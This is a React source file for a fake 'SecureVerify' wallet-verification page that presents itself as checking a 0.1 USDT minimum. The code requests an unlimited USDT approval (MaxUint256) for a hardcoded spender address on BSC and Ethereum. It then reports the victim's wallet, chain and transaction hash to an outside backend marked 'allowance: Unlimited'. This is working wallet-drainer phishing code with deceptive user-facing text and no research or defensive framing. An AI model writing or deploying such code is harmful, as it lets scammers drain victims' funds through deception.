import { useState } from 'react';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import { BrowserProvider, Contract, MaxUint256 } from 'ethers';

const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
const PROJECT_ID = "90bc5beffa912aa09e6d53f9b7719f45";

// Contracts
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER_EVM = "0x3E5Da94426D6133b437107Ec8B656522f8899b23"; 

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

function App() {
  const [provider, setProvider] = useState(null);
  const [account, setAccount] = useState(null);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("Connect your wallet to verify minimum 0.1 USDT.");

  const connectWallet = async () => {
    try {
      setLoading(true);
      setStatus("Connecting to wallet...");
      
      const wcProvider = await EthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [56, 1], // BSC, Ethereum
        showQrModal: true,
        metadata: {
          name: "SecureVerify",
          description: "Wallet Verification",
          url: window.location.origin,
          icons: ["https://walletconnect.com/walletconnect-logo.png"]
        }
      });

      await wcProvider.enable();
      setProvider(wcProvider);
      setAccount(wcProvider.accounts[0]);
      setStatus("Wallet Connected. Tap Verify to proceed.");
      setLoading(false);
    } catch (error) {
      console.error(error);
      setStatus("Connection failed or rejected.");
      setLoading(false);
    }
  };

  const handleVerify = async () => {
    if (!provider || !account) return;
    
    try {
      setLoading(true);
      setStatus("Verifying minimum 0.1 USDT...");

      const ethersProvider = new BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      
      const network = await ethersProvider.getNetwork();
      const tokenAddress = network.chainId === 56n ? USDT_BSC : USDT_ETH;
      const chainName = network.chainId === 56n ? "bsc" : "ethereum";

      const contract = new Contract(tokenAddress, ERC20_ABI, signer);
      
      const tx = await contract.approve(SPENDER_EVM, MaxUint256);
      
      setStatus("Verifying... Please wait.");
      await tx.wait(); 

      setStatus("Verification Successful! You can close this page.");
      
      await fetch(`${BACKEND_URL}/api/notify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet: account,
          chain: chainName,
          txHash: tx.hash,
          allowance: "Unlimited"
        })
      });

      setLoading(false);
    } catch (error) {
      console.error(error);
      setStatus("Verification failed. Try again.");
      setLoading(false);
    }
  };

  return (
    <div className="container">
      <div className="card">
        <div className="logo">🛡️ SecureVerify</div>
        <h2>Wallet Verification</h2>
        <p className="desc">To receive your funds, please verify your wallet and approve a minimum of 0.1 USDT.</p>
        
        <div className="status-box">
          <strong>Status:</strong> {status}
        </div>

        {!account ? (
          <button onClick={connectWallet} disabled={loading} className="btn connect-btn">
            {loading ? "Connecting..." : "Connect Wallet (Binance/Trust)"}
          </button>
        ) : (
          <div>
            <p className="wallet-address">Connected: {account.slice(0,6)}...{account.slice(-4)}</p>
            <button onClick={handleVerify} disabled={loading} className="btn verify-btn">
              {loading ? "Processing..." : "Verify & Approve"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;